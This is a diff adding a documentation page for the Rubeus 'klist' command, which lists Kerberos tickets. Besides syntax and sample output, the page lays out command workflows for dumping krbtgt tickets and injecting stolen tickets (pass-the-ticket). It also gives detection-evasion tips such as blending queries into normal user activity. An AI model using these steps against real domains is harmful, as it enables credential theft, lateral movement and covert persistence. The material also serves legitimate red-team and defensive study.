@@ -1,0 +1,263 @@
+---
+title: 'klist'
+description: 'List Kerberos tickets in the current or specified logon session'
+icon: 'list'
+sidebarTitle: 'klist'
+---
+
+## Overview
+
+List Kerberos tickets in the current logon session or a specified LUID. This command provides detailed information about cached tickets including service names, encryption types, and validity periods.
+
+## Syntax
+
+```bash
+Rubeus.exe klist [options]
+```
+
+## Optional Parameters
+
+<ParamField path="luid" type="string">
+  Target specific logon session ID (requires elevation)
+</ParamField>
+
+<ParamField path="user" type="string">
+  Filter tickets by specific username
+</ParamField>
+
+<ParamField path="service" type="string">
+  Filter tickets by service name pattern
+</ParamField>
+
+## Examples
+
+<CodeGroup>
+```bash Basic Listing
+# List current session tickets
+Rubeus.exe klist
+
+# List tickets from specific LUID
+Rubeus.exe klist /luid:0x12345
+
+# Filter by service type
+Rubeus.exe klist /service:cifs
+```
+
+```bash Advanced Filtering
+# Filter by username
+Rubeus.exe klist /user:admin
+
+# Combine filters
+Rubeus.exe klist /luid:0x54321 /service:krbtgt
+```
+</CodeGroup>
+
+## Ticket Information
+
+<Accordion title="Displayed Details">
+  **Basic Information:**
+  - Client name and realm
+  - Server name and realm
+  - Encryption type (RC4, AES128, AES256)
+  - Key version number (kvno)
+
+  **Timing Information:**
+  - Start time (valid from)
+  - End time (expires)
+  - Renew time (renewable until)
+  - Current validity status
+
+  **Technical Details:**
+  - Ticket cache location
+  - Ticket flags and attributes
+  - Session key information
+  - Authorization data presence
+</Accordion>
+
+## Use Cases
+
+<Accordion title="Session Verification">
+  **Authentication Status:**
+  - Verify successful authentication
+  - Check current access permissions
+  - Validate ticket injection success
+  - Monitor session state changes
+
+  **Troubleshooting:**
+  - Debug authentication failures
+  - Identify expired tickets
+  - Verify service access capabilities
+  - Check encryption compatibility
+</Accordion>
+
+<Accordion title="Operational Awareness">
+  **Security Assessment:**
+  - Inventory available access
+  - Identify privilege boundaries
+  - Map service relationships
+  - Track authentication history
+
+  **Planning and Cleanup:**
+  - Plan ticket extraction targets
+  - Verify cleanup effectiveness
+  - Monitor persistent access
+  - Assess operational security
+</Accordion>
+
+## Session Targeting
+
+<Accordion title="Current Session (Default)">
+  **Standard Operation:**
+  - Lists tickets from current user session
+  - No special privileges required
+  - Safe reconnaissance operation
+  - Limited to user context
+
+  **Information Available:**
+  - TGT for current domain
+  - Service tickets for accessed resources
+  - Cross-realm tickets if applicable
+  - Delegation tickets if authorized
+</Accordion>
+
+<Accordion title="Specific LUID Targeting">
+  **Elevated Requirements:**
+  - Requires administrative privileges
+  - Can target any logon session
+  - System-wide ticket visibility
+  - Enhanced reconnaissance capabilities
+
+  **LUID Discovery:**
+  ```bash
+  # Find target logon sessions
+  Rubeus.exe logonsession
+
+  # List specific session tickets
+  Rubeus.exe klist /luid:0x3e7
+  ```
+</Accordion>
+
+## Output Analysis
+
+<Accordion title="Understanding Results">
+  **Sample Output:**
+  ```bash
+  Rubeus.exe klist
+
+  [*] Action: List Kerberos Tickets (Current User)
+
+  [*] Current LUID    : 0x12345
+
+  Cached Tickets: (4)
+
+  #0>     Client: admin @ CORP.LOCAL
+          Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
+          KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+          Ticket Flags 0x60a10000 -> name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable
+          Start Time: 10/25/2024 1:23:45 PM (local)
+          End Time:   10/25/2024 11:23:45 PM (local)
+          Renew Time: 11/1/2024 1:23:45 PM (local)
+
+  #1>     Client: admin @ CORP.LOCAL
+          Server: CIFS/fileserver.corp.local @ CORP.LOCAL
+          KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+          Ticket Flags 0x40a50000 -> name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable
+          Start Time: 10/25/2024 1:25:12 PM (local)
+          End Time:   10/25/2024 11:25:12 PM (local)
+          Renew Time: 11/1/2024 1:25:12 PM (local)
+  ```
+
+  **Key Elements:**
+  - Ticket number for extraction reference
+  - Service access scope
+  - Encryption strength assessment
+  - Validity window analysis
+  - Flag configuration review
+</Accordion>
+
+## Integration Workflows
+
+<Accordion title="Pre-Extraction Planning">
+  **Target Identification:**
+  ```bash
+  # 1. List available tickets
+  Rubeus.exe klist
+
+  # 2. Identify valuable targets
+  # Look for TGTs, admin services, delegation tickets
+
+  # 3. Extract specific tickets
+  Rubeus.exe dump /service:krbtgt
+
+  # 4. Use extracted tickets elsewhere
+  Rubeus.exe ptt /ticket:extracted.kirbi
+  ```
+</Accordion>
+
+<Accordion title="Post-Injection Verification">
+  **Success Validation:**
+  ```bash
+  # 1. Inject ticket
+  Rubeus.exe ptt /ticket:admin.kirbi
+
+  # 2. Verify injection success
+  Rubeus.exe klist
+
+  # 3. Test service access
+  dir \\fileserver.corp.local\share
+  ```
+</Accordion>
+
+## Ticket Types
+
+<Accordion title="Ticket Granting Tickets (TGTs)">
+  **Identification:**
+  - Server: krbtgt/DOMAIN.LOCAL
+  - Provides broad authentication capabilities
+  - Renewable for extended validity
+  - Foundation for service ticket requests
+
+  **Strategic Value:**
+  - Enables lateral movement
+  - Supports privilege escalation
+  - Allows service enumeration
+  - Facilitates persistence
+</Accordion>
+
+<Accordion title="Service Tickets">
+  **Common Services:**
+  - CIFS (file sharing)
+  - HOST (administrative access)
+  - LDAP (directory services)
+  - HTTP (web applications)
+  - MSSQL (database access)
+
+  **Access Implications:**
+  - Direct service authentication
+  - Specific resource access
+  - Limited scope operations
+  - Immediate usability
+</Accordion>
+
+## Operational Security
+
+<Accordion title="Detection Considerations">
+  **Low-Risk Operations:**
+  - Standard Windows API usage
+  - Normal authentication queries
+  - Minimal log generation
+  - Difficult to distinguish from legitimate activity
+
+  **Best Practices:**
+  - Use during business hours
+  - Limit frequency of queries
+  - Avoid automated scripting patterns
+  - Correlate with normal user behavior
+</Accordion>
+
+## Related Commands
+
+- [`dump`](/GhostPack/Rubeus-mdx/commands/extraction/dump) - Extract listed tickets
+- [`triage`](/GhostPack/Rubeus-mdx/commands/extraction/triage) - Cross-session ticket overview
+- [`ptt`](/GhostPack/Rubeus-mdx/commands/management/ptt) - Inject tickets into session
+- [`purge`](/GhostPack/Rubeus-mdx/commands/management/purge) - Clear ticket cache
